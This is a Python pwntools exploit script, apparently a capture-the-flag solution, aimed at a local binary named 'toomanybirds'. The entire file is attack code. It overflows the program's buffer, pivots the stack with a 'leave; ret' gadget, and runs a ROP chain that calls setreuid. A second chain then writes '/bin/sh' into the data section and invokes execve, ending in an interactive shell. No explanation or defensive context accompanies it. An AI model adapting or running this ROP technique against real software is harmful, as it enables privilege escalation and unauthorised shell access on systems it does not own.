from pwn import *
from struct import pack

context.arch = 'amd64'
context.os = 'linux'

io = process('./toomanybirds')
io.recvuntil(b'> ')
io.sendline("32768".encode())
p1 = b'a' * 511
p1 += p64(0x0000000000401e31) # leave; ret;
p1 += p64(0x4141414141414141) # padding
p1 += p64(0x4141414141414141) # padding

p1 += p64(0x000000000044e580) # pop rax; ret;
p1 += p64(0x71)
p1 += p64(0x0000000000405f97) # pop rsi; ret;
p1 += p64(1006) # data for rsi
p1 += p64(0x000000000040186a) # pop rdi; ret;
p1 += p64(1006) # data for rdi
p1 += p64(0x000000000041cb14) # syscall; ret;

p = b''

p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x000000000044e580) # pop rax ; ret
p += b'/bin/sh\x00'
p += pack('<Q', 0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x000000000044e580) # pop rax ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data + 8
p += pack('<Q', 0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0f0) # @ .data + 16
p += pack('<Q', 0x00000000004434b9) # xor rax, rax ; ret
p += pack('<Q', 0x000000000048c5e5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040186a) # pop rdi ; ret
p += pack('<Q', 0x00000000004ca0e0) # @ .data
p += pack('<Q', 0x0000000000405f97) # pop rsi ; ret
p += pack('<Q', 0x00000000004ca0e8) # @ .data + 8
p += pack('<Q', 0x000000000048e8eb) # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004ca0f0) # @ .data + 16
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004434b9) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000482c60) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000401223) # syscall

io.sendline(p1 + p + b'a'*(40000-len(p1+p)))
io.clean()
io.interactive()
